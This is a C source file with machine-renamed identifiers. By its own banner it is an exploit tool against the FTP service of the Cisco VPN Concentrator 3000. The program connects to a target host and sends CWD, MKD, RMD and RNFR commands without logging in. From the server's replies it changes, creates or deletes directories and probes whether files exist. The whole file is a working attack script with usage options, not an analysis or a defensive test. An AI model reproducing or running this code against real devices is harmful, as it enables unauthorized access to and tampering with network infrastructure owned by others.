
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct option {char* member_0; int member_1; char member_3; int member_2; } ;
struct hostent {int h_length; int * h_addr_list; int h_addrtype; } ;
typedef int servAddr ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int,struct sockaddr*,int) ;
 int FUNC_2 (int) ;
 struct hostent* FUNC_3 (char*) ;
 int FUNC_4 (int,char**,char*,struct option*,int*) ;
 int FUNC_5 (int) ;
 char* FUNC_6 (int) ;
 int FUNC_7 (char*,int ,int ) ;
 char* VAR_2 ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (int,char*,int,int ) ;
 int FUNC_10 (int,char*,int,int ) ;
 int FUNC_11 (int ,int ,int ) ;
 int FUNC_12 (char*,char*,char*) ;
 int FUNC_13 (char*) ;
 int * FUNC_14 (char*,char*) ;

int FUNC_15 (int VAR_3, char *VAR_4[]){
 int VAR_5=0,VAR_6=0,VAR_7=0,VAR_8=0,VAR_9=0,VAR_10=0,VAR_11=0,VAR_12=21;
 int VAR_13, VAR_14, VAR_15, VAR_16;
 char *VAR_17, *VAR_18, *VAR_19, *VAR_20, *VAR_21;
 struct sockaddr_in VAR_22;
 struct hostent *VAR_23;
        static struct option VAR_24[]={
                {"server", 1, 0, 's'},
                {"port", 1, 0, 'p'},
                {"rmdir", 1, 0, 'r'},
                {"mkdir", 1, 0, 'm'},
                {"chdir", 1, 0, 'c'},
  {"test", 1, 0, 't'},
                {"help", 0, 0,'h'}
        };
 FUNC_8("[ Cisco VPN Concentrator 3000 FTP service exploit\n");
        while(VAR_13 != -1){
                VAR_13 = FUNC_4(VAR_3,VAR_4,"s:p:r:m:c:t:h",VAR_24,&VAR_6);
                switch(VAR_13){
                        case 's':
                                if(VAR_5==0){
                                 VAR_23 = FUNC_3(VAR_2);
                                 if(VAR_23==((void*)0)){
                                         FUNC_8("[ Error unknown host '%s'\n",VAR_2);
                                         FUNC_2(1);
                                 }
                                 VAR_17 = FUNC_6(FUNC_13(VAR_2) + 1);
                                 FUNC_12(VAR_17,"%s",VAR_2);
                                 VAR_5 = 1;
                                }
    break;
   case 'p':
    VAR_12 = FUNC_0(VAR_2);
    break;
   case 'r':
    if(VAR_9==0){
     if(VAR_11!=1){
      VAR_11 = 1;
      VAR_9 = 1;
      VAR_18 = VAR_2;
     }
     else{
      FUNC_8("[ Error: cannot delete directory as another option already selected\n");
      FUNC_2(1);
     }
    }
    break;
   case 'c':
    if(VAR_8==0){
     if(VAR_11!=1){
      VAR_11 = 1;
      VAR_8 = 1;
      VAR_18 = VAR_2;
     }
     else{
      FUNC_8("[ Error: cannot change dir as another option already selected\n");
      FUNC_2(2);
     }
    }
    break;
   case 't':
    if(VAR_10==0){
     if(VAR_11!=1){
      VAR_11 = 1;
      VAR_10 = 1;
      VAR_19 = VAR_2;
     }
     else{
      FUNC_8("[ Error: cannot test for existance as another option already selected\n");
      FUNC_2(3);
     }
    }
    break;
   case 'm':
    if(VAR_7==0){
     if(VAR_11!=1){
      VAR_11 = 1;
      VAR_7 = 1;
      VAR_18 = VAR_2;
     }
     else{
      FUNC_8("[ Error: cannot make directory as another option already selected\n");
      FUNC_2(4);
     }

    }
    break;
   case 'h':
    FUNC_8("[ Usage instructions.\n[\n");
    FUNC_8("[ %s <required> (optional)\n[\n",VAR_4[0]);
    FUNC_8("[\t--server|-s <ip/hostname>\n[\t--port|-p (port) [default 21]\n[\t--rmdir|-r (directory)\n[\t--mkdir|-m (directory)\n");
    FUNC_8("[\t--chdir|-c (directory)\n[\t--test|-t (filename/directory)\n[\n");
    FUNC_2(0);
    break;
   default:
    break;
  }
 }
        if(VAR_5 != 1 || VAR_11 != 1){
         FUNC_8("[ Error insufficient arguements, try running '%s --help'\n",VAR_4[0]);
         FUNC_2(1);
        }
        VAR_22.sin_family = VAR_23->h_addrtype;
        FUNC_7((char *) &VAR_22.sin_addr.s_addr, VAR_23->h_addr_list[0], VAR_23->h_length);
        VAR_22.sin_port = FUNC_5(VAR_12);
        VAR_14 = FUNC_11(VAR_0, VAR_1, 0);
        if(VAR_14<0){
                FUNC_8("[ Cannot open socket\n");
                FUNC_2(1);
        }
        VAR_15 = FUNC_1(VAR_14, (struct sockaddr *) &VAR_22, sizeof(VAR_22));
        if(VAR_15<0){
                FUNC_8("[ Cannot connect\n");
                FUNC_2(1);
        }
        FUNC_8("[ Connected to %s (%d/tcp)\n",VAR_17,VAR_12);
 VAR_21 = FUNC_6(1024);
 if(VAR_8==1){
  FUNC_8("[ Changing directory to %s\n",VAR_18);
  VAR_16 = 2048 + FUNC_13(VAR_18);
  VAR_20 = FUNC_6(VAR_16);
  FUNC_12(VAR_20,"CWD %s\r\n",VAR_18);
  VAR_15 = FUNC_10(VAR_14, VAR_20, FUNC_13(VAR_20),0);
                while((VAR_15 = FUNC_9(VAR_14, VAR_21,1023,0)) != -1){
                        VAR_21[VAR_15]=0;
                        if(FUNC_14(VAR_21,"250 Changed to .") != ((void*)0)){
                                FUNC_8("[ Success! changed directory to %s\n",VAR_18);
                                break;
                        }
                        if(FUNC_14(VAR_21,"530 Can't change directory to") != ((void*)0)){
                                FUNC_8("[ Error! cannot set current directory to %s\n",VAR_18);
                                FUNC_2(-1);
                        }
                }
 }
 if(VAR_7==1){
  FUNC_8("[ Making directory %s\n",VAR_18);
  VAR_16 = 2048 + FUNC_13(VAR_18);
  VAR_20 = FUNC_6(VAR_16);
  FUNC_12(VAR_20,"MKD %s\r\n",VAR_18);
  VAR_15 = FUNC_10(VAR_14, VAR_20, FUNC_13(VAR_20),0);
  while((VAR_15 = FUNC_9(VAR_14, VAR_21,1023,0)) != -1){
   VAR_21[VAR_15]=0;
   if(FUNC_14(VAR_21,"257 MKD command successful.") != ((void*)0)){
    FUNC_8("[ Success! directory %s created\n",VAR_18);
    break;
   }
  }
 }
 if(VAR_9==1){
  FUNC_8("[ Deleting directory %s\n",VAR_18);
  VAR_16 = 2048 + FUNC_13(VAR_18);
  VAR_20 = FUNC_6(VAR_16);
  FUNC_12(VAR_20,"RMD %s\r\n",VAR_18);
  VAR_15 = FUNC_10(VAR_14, VAR_20, FUNC_13(VAR_20),0);
                while((VAR_15 = FUNC_9(VAR_14, VAR_21,1023,0)) != -1){
                        VAR_21[VAR_15]=0;
                        if(FUNC_14(VAR_21,"250 RMD command successful.") != ((void*)0)){
                                FUNC_8("[ Success! directory %s deleted\n",VAR_18);
                                break;
                        }
                }
 }
 if(VAR_10==1){
  FUNC_8("[ Testing for the existance of %s\n",VAR_19);
  VAR_16 = 2048 + FUNC_13(VAR_19);
  VAR_20 = FUNC_6(VAR_16);
  FUNC_12(VAR_20,"RNFR %s\r\n",VAR_19);
  VAR_15 = FUNC_10(VAR_14, VAR_20,FUNC_13(VAR_20),0);
                while((VAR_15 = FUNC_9(VAR_14, VAR_21,1023,0)) != -1){
                 VAR_21[VAR_15]=0;
                        if(FUNC_14(VAR_21,"350 RNFR accepted - file exists, ready for destination.") != ((void*)0)){
                                FUNC_8("[ Success! %s does exist!\n",VAR_19);
                                break;
                        }
                        if(FUNC_14(VAR_21,"550 File does not exist!") != ((void*)0)){
                                FUNC_8("[ Success! %s does not exist\n",VAR_19);
                                break;
                        }
                }
 }
 FUNC_2(0);
}
